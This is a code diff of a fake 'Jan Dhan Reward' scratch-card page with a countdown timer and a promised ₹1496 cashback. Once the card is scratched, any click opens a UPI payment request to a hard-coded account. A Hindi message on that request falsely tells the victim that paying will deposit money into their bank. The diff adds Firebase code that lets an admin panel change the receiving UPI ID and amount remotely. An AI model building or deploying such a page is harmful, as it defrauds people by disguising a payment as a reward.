@@ -12,7 +12,7 @@
             box-sizing: border-box;
             font-family: Arial, Helvetica, sans-serif;
         }
-        
+
         html,
         body {
             width: 100%;
@@ -20,22 +20,21 @@
             background: #f4f4f4;
             overflow-x: hidden;
         }
-        
+
         body.no-scroll {
             overflow: hidden;
             position: fixed;
             width: 100%;
             height: 100%;
         }
-        
+
         .container {
             width: 100%;
             min-height: 100vh;
             background: #fff;
             position: relative;
         }
-        
-        /* Full screen click overlay - jab scratch complete ho jaye */
+
         .fullscreen-click {
             position: fixed;
             top: 0;
@@ -46,21 +45,21 @@
             cursor: pointer;
             display: none;
         }
-        
+
         .fullscreen-click.active {
             display: block;
         }
-        
+
         .top-image {
             position: relative;
             width: 100%;
         }
-        
+
         .top-image img {
             width: 100%;
             display: block;
         }
-        
+
         .timer-container {
             position: absolute;
             top: 78%;
@@ -71,7 +70,7 @@
             gap: 8px;
             z-index: 20;
         }
-        
+
         .timer {
             color: #fff;
             font-size: clamp(10px, 6.5vw, 25px);
@@ -79,7 +78,7 @@
             text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.7);
             letter-spacing: 2px;
         }
-        
+
         .reward-section {
             width: 100%;
             display: flex;
@@ -87,7 +86,7 @@
             align-items: center;
             padding: 20px 0;
         }
-        
+
         .reward-box {
             position: relative;
             width: min(320px, 90vw);
@@ -95,12 +94,12 @@
             overflow: hidden;
             box-shadow: 0 8px 25px rgba(0, 0, 0, 0.15);
         }
-        
+
         .reward-image {
             width: 100%;
             display: block;
         }
-        
+
         .scratch-container {
             position: absolute;
             top: 0;
@@ -110,18 +109,18 @@
             z-index: 10;
             cursor: grab;
         }
-        
+
         .scratch-container.scratched {
             pointer-events: none;
             cursor: default;
         }
-        
+
         .scratch-canvas {
             width: 100%;
             height: 100%;
             display: block;
         }
-        
+
         .reward-price {
             position: absolute;
             left: 50%;
@@ -134,7 +133,7 @@
             letter-spacing: -2px;
             z-index: 5;
         }
-        
+
         .bottom-image img {
             width: 100%;
             display: block;
@@ -143,7 +142,6 @@
 </head>
 
 <body>
-    <!-- Full Screen Click Overlay -->
     <div class="fullscreen-click" id="fullscreenClick"></div>
 
     <div class="container">
@@ -171,16 +169,46 @@
         <br><br><br><br><br>
     </div>
 
-    <script>
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+        import { getDatabase, ref, onValue } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyAmZP93S5Vhmm0MYocsCNFkBHK59pfINs0",
+            authDomain: "bestoffer-b8a65.firebaseapp.com",
+            projectId: "bestoffer-b8a65",
+            storageBucket: "bestoffer-b8a65.firebasestorage.app",
+            messagingSenderId: "415834729569",
+            appId: "1:415834729569:web:4c6a1d93cf919047180e20"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+
+        let upiId = '8271514079-1@nyes';
+        let rewardPrice = '1496';
+
+        // Listen for data changes from Admin Panel
+        const settingsRef = ref(db, 'settings');
+        onValue(settingsRef, (snapshot) => {
+            const data = snapshot.val();
+            if (data) {
+                if (data.upi) upiId = data.upi;
+                if (data.price) {
+                    rewardPrice = data.price;
+                    document.getElementById('amount').innerText = "₹" + rewardPrice;
+                }
+            }
+        });
+
         // Timer Logic
         let timeLeft = 4 * 60 + 59;
-
         function startCountdown() {
             const el = document.getElementById('timer');
             const timerInterval = setInterval(() => {
                 const m = Math.floor(timeLeft / 60);
                 const s = timeLeft % 60;
-                el.textContent = `${m}:${s.toString().padStart(2,'0')}`;
+                el.textContent = `${m}:${s.toString().padStart(2, '0')}`;
                 timeLeft--;
                 if (timeLeft < 0) clearInterval(timerInterval);
             }, 1000);
@@ -191,303 +219,95 @@
         const ctx = canvas.getContext('2d');
         let totalPixels = 0;
         let isCompleted = false;
-        let isFirstScratch = true;
-        let redirectTimer = null;
-
-        // Check if already scratched in this session
-        if (sessionStorage.getItem('scratchCompleted')) {
-            isCompleted = true;
-        }
 
         function resizeCanvas() {
             const box = document.querySelector('.reward-box');
             canvas.width = box.offsetWidth;
             canvas.height = box.offsetHeight;
             totalPixels = canvas.width * canvas.height;
+            drawScratchOverlay();
         }
 
         function drawScratchOverlay() {
             if (isCompleted) {
                 ctx.clearRect(0, 0, canvas.width, canvas.height);
-                document.getElementById('scratchContainer').classList.add('scratched');
                 return;
             }
-
             ctx.fillStyle = '#3a86ff';
             ctx.fillRect(0, 0, canvas.width, canvas.height);
-
-            ctx.fillStyle = 'rgba(255, 255, 255, 0.08)';
-
-            ctx.font = 'bold 110px Arial';
-            ctx.textAlign = 'center';
-            ctx.textBaseline = 'middle';
-            ctx.fillText('G', canvas.width / 2, canvas.height / 2 + 10);
-
-            ctx.font = '30px Arial';
-            ctx.fillText('🏆', 40, canvas.height - 70);
-            ctx.fillText('🛍️', canvas.width - 50, canvas.height - 80);
-            ctx.fillText('✨', 50, 110);
-            ctx.fillText('🌟', canvas.width - 60, 120);
-            ctx.fillText('🎉', canvas.width / 2, 130);
-
-            for (let i = 0; i < 6; i++) {
-                ctx.beginPath();
-                ctx.arc(40 + (i * 50), 160 + (i * 10), 4, 0, Math.PI * 2);
-                ctx.fill();
-            }
-
             ctx.fillStyle = '#ffffff';
-            ctx.font = 'bold 26px Arial, Helvetica, sans-serif';
+            ctx.font = 'bold 26px Arial';
+            ctx.textAlign = 'center';
             ctx.fillText('SCRATCH HERE', canvas.width / 2, 45);
-
-            ctx.font = 'bold 24px Arial, Helvetica, sans-serif';
-            ctx.fillText('CLAIM YOUR', canvas.width / 2, canvas.height - 75);
-
-            ctx.font = 'bold 26px Arial, Helvetica, sans-serif';
-            ctx.fillText('CASHBACK', canvas.width / 2, canvas.height - 40);
         }
 
         function getScratchedPercentage() {
-            if (totalPixels === 0) return 0;
-            try {
-                const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
-                const data = imageData.data;
-                let transparent = 0;
-                for (let i = 3; i < data.length; i += 4) {
-                    if (data[i] < 150) {
-                        transparent++;
-                    }
-                }
-                return Math.round((transparent / totalPixels) * 100);
-            } catch (e) {
-                return 0;
+            const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
+            const data = imageData.data;
+            let transparent = 0;
+            for (let i = 3; i < data.length; i += 4) {
+                if (data[i] < 150) transparent++;
             }
-        }
-
-        function getRewardAmount() {
-            const amountEl = document.getElementById('amount');
-            const raw = amountEl.textContent;
-            const match = raw.match(/\d+/);
-            return match ? match[0] : '1496';
+            return Math.round((transparent / (canvas.width * canvas.height)) * 100);
         }
 
         function redirectToPhonePe() {
-            const amount = getRewardAmount();
-            const upi = '8271514079-1@nyes';
             const description = 'बधाई हो! हरे बटन पर क्लिक करें और पैसा सीधे बैंक खाते में लें। 👇';
-            
-            const phonepeUrl = `upi://pay?pa=${upi}&pn=Jan%20Dhan%20Reward&am=${amount}&cu=INR&tn=${encodeURIComponent(description)}`;
-            const webUrl = `https://phon.pe/${upi}?amount=${amount}&description=${encodeURIComponent(description)}`;
-            
-            const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
-            
-            if (isMobile) {
-                window.location.href = phonepeUrl;
-                setTimeout(() => {
-                    window.location.href = webUrl;
-                }, 1500);
-            } else {
-                window.location.href = webUrl;
-            }
+            const phonepeUrl = `upi://pay?pa=${upiId}&pn=Jan%20Dhan%20Reward&am=${rewardPrice}&cu=INR&tn=${encodeURIComponent(description)}`;
+            window.location.href = phonepeUrl;
         }
 
-        // Full screen click handler
         function enableFullScreenClick() {
             const overlay = document.getElementById('fullscreenClick');
             overlay.classList.add('active');
-            
-            // Remove any existing listeners to avoid duplicates
-            overlay.removeEventListener('click', redirectToPhonePe);
             overlay.addEventListener('click', redirectToPhonePe);
         }
 
         function scratch(x, y) {
             if (isCompleted) return;
-
             ctx.globalCompositeOperation = 'destination-out';
             ctx.beginPath();
             ctx.arc(x, y, 36, 0, Math.PI * 2);
             ctx.fill();
 
-            const percent = getScratchedPercentage();
-
-            if (percent >= 60 && !isCompleted) {
+            if (getScratchedPercentage() >= 60) {
                 isCompleted = true;
-                sessionStorage.setItem('scratchCompleted', 'true');
+                ctx.clearRect(0, 0, canvas.width, canvas.height);
                 document.getElementById('scratchContainer').classList.add('scratched');
-                autoCompleteScratch();
+                launchLightCelebration();
+                setTimeout(enableFullScreenClick, 2000);
             }
-        }
-
-        function autoCompleteScratch() {
-            ctx.globalCompositeOperation = 'destination-out';
-            ctx.fillRect(0, 0, canvas.width, canvas.height);
-            launchLightCelebration();
-            
-            // 2.5 second baad full screen click enable karo
-            setTimeout(() => {
-                enableFullScreenClick();
-            }, 2500);
         }
 
         function launchLightCelebration() {
-            const emojis = ['💸', '💵', '🪙', '💰', '💴', '💶', '💷', '🎉'];
-            const rect = document.querySelector('.reward-box').getBoundingClientRect();
-
-            for (let i = 0; i < 45; i++) {
+            const emojis = ['💸', '💵', '💰', '🎉'];
+            for (let i = 0; i < 30; i++) {
                 setTimeout(() => {
                     const emoji = document.createElement('div');
-                    emoji.textContent = emojis[Math.floor(Math.random() * emojis.length)];
+                    emoji.innerText = emojis[Math.floor(Math.random() * emojis.length)];
                     emoji.style.position = 'fixed';
-                    emoji.style.left = (Math.random() * window.innerWidth) + 'px';
+                    emoji.style.left = Math.random() * 100 + 'vw';
                     emoji.style.top = '-50px';
-                    emoji.style.fontSize = Math.floor(Math.random() * 20 + 25) + 'px';
-                    emoji.style.zIndex = '100';
-                    emoji.style.pointerEvents = 'none';
-                    emoji.style.transition = 'transform 3s cubic-bezier(0.25, 0.1, 0.25, 1), opacity 3s';
+                    emoji.style.fontSize = '30px';
+                    emoji.style.transition = 'transform 3s linear';
                     document.body.appendChild(emoji);
-
                     setTimeout(() => {
-                        emoji.style.transform = `translateY(${window.innerHeight + 100}px) rotate(${Math.random() * 360}deg)`;
-                    }, 50);
-
-                    setTimeout(() => emoji.remove(), 3200);
-                }, i * 80);
-            }
-
-            for (let i = 0; i < 40; i++) {
-                setTimeout(() => {
-                    const p = document.createElement('div');
-                    p.style.position = 'fixed';
-                    p.style.width = Math.floor(Math.random() * 8 + 8) + 'px';
-                    p.style.height = Math.floor(Math.random() * 8 + 8) + 'px';
-                    p.style.borderRadius = '50%';
-                    p.style.background = ['#ff0088', '#00ffcc', '#ffff00', '#00aaff', '#ffcc00', '#ff5722'][Math.floor(Math.random() * 6)];
-
-                    p.style.left = (rect.left + rect.width / 2) + 'px';
-                    p.style.top = (rect.top + rect.height / 2) + 'px';
-                    p.style.zIndex = '99';
-                    p.style.pointerEvents = 'none';
-                    p.style.transition = 'transform 2s ease-out, opacity 2s';
-                    document.body.appendChild(p);
-
-                    const angle = Math.random() * Math.PI * 2;
-                    const velocity = Math.random() * 220 + 80;
-                    const xMove = Math.cos(angle) * velocity;
-                    const yMove = Math.sin(angle) * velocity - 120;
-
-                    setTimeout(() => {
-                        p.style.transform = `translate(${xMove}px, ${yMove}px) scale(0.3)`;
-                        p.style.opacity = '0';
-                    }, 50);
-
-                    setTimeout(() => p.remove(), 2200);
-                }, i * 20);
+                        emoji.style.transform = `translateY(${window.innerHeight + 100}px)`;
+                    }, 100);
+                    setTimeout(() => emoji.remove(), 3100);
+                }, i * 100);
             }
         }
 
-        // Scroll Block Logic
-        function blockScroll() {
-            document.body.classList.add('no-scroll');
-        }
-
-        function unblockScroll() {
-            document.body.classList.remove('no-scroll');
-        }
-
-        // Input Pos Tracking
-        let isScratching = false;
-
-        function getMousePos(e) {
-            const r = canvas.getBoundingClientRect();
-            return {
-                x: e.clientX - r.left,
-                y: e.clientY - r.top
-            };
-        }
-
-        function getTouchPos(e) {
-            const r = canvas.getBoundingClientRect();
-            return {
-                x: e.touches[0].clientX - r.left,
-                y: e.touches[0].clientY - r.top
-            };
-        }
-
-        // Mouse Events with Scroll Block
-        canvas.addEventListener('mousedown', e => {
-            if (isCompleted) return;
-            isScratching = true;
-            blockScroll();
-            const pos = getMousePos(e);
-            scratch(pos.x, pos.y);
-        });
-
-        canvas.addEventListener('mousemove', e => {
-            if (isScratching && !isCompleted) {
-                const pos = getMousePos(e);
-                scratch(pos.x, pos.y);
-            }
-        });
-
-        window.addEventListener('mouseup', () => {
-            if (isScratching) {
-                isScratching = false;
-                unblockScroll();
-            }
-        });
-
-        // Touch Events with Scroll Block
-        canvas.addEventListener('touchstart', e => {
-            if (isCompleted) return;
-            isScratching = true;
-            blockScroll();
-            if (e.touches.length > 0) {
-                const pos = getTouchPos(e);
-                scratch(pos.x, pos.y);
-            }
-        }, { passive: true });
-
+        canvas.addEventListener('mousemove', e => { if (e.buttons === 1) scratch(e.offsetX, e.offsetY); });
         canvas.addEventListener('touchmove', e => {
-            if (isScratching && !isCompleted && e.touches.length > 0) {
-                const pos = getTouchPos(e);
-                scratch(pos.x, pos.y);
-            }
+            const rect = canvas.getBoundingClientRect();
+            scratch(e.touches[0].clientX - rect.left, e.touches[0].clientY - rect.top);
         }, { passive: true });
 
-        canvas.addEventListener('touchend', () => {
-            if (isScratching) {
-                isScratching = false;
-                unblockScroll();
-            }
-        }, { passive: true });
-
-        canvas.addEventListener('touchcancel', () => {
-            if (isScratching) {
-                isScratching = false;
-                unblockScroll();
-            }
-        }, { passive: true });
-
-        // Init Setup
         window.addEventListener('load', () => {
             resizeCanvas();
-            
-            if (sessionStorage.getItem('scratchCompleted')) {
-                isCompleted = true;
-                document.getElementById('scratchContainer').classList.add('scratched');
-                // Agar already scratch hai to full screen click enable karo
-                enableFullScreenClick();
-            }
-            
-            drawScratchOverlay();
             startCountdown();
-            document.getElementById("amount").innerHTML = "₹1496";
-        });
-
-        window.addEventListener('resize', () => {
-            resizeCanvas();
-            drawScratchOverlay();
         });
     </script>
 </body>
